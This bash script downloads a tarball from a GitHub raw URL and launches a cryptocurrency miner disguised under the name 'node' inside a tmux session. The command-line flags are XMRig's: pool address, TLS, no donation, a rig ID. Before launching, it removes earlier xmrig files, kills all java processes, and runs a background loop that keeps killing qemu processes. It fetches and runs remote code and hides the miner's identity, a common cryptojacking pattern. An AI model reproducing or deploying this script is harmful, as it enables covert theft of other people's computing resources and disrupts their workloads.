#!/bin/bash

SESSION="node"
DOMAIN="$1"
NAME_WORK="$2"

# Kill qemu liên tục trong nền
( while sleep 3; do
    pkill -f qemu-system-x86_64-headless || true
done ) &

# Kill java nếu cần
pkill -9 -f java || true
sleep 1
if pgrep -f java >/dev/null; then
    pkill -9 -f java || true
fi

# Tạo tmux session
if tmux has-session -t $SESSION 2>/dev/null; then
    tmux attach-session -t $SESSION
else
    tmux new-session -s $SESSION -d

    tmux send-keys -t $SESSION "
        rm -rf ./xmrig* &&
        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz &&
        tar -xzf node.tar.gz &&
        cd node-18 &&
        chmod +x node &&
        exec ./node -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
    " C-m

    tmux attach-session -t $SESSION
fi
